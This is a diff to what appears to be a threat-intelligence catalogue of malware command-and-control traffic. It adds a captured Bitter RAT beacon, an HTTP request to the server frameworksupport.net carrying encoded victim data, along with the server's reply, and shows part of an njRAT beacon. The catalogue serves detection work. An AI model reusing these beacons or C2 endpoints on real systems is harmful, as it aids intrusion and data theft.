@@ -76,6 +76,28 @@ J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")
 
+#### Bitter RAT (Patchwork)
+~~~
+GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
+Host: frameworksupport.net
+Connection: close
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 74
+Date: Sat, 12 Jan 2019 02:44:27 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Connection: close
+
+90059c37-1320-41a4-b58d-2b75a9850d2f 78.109.23.2 User-PC EXE: ##
+SIZE: ##
+
+AXE: ##
+SIZE: #45#SRE: ##
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitter.png "Bitter RAT")
+
 #### Bladabindi aka nJrat
 ~~~
 147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
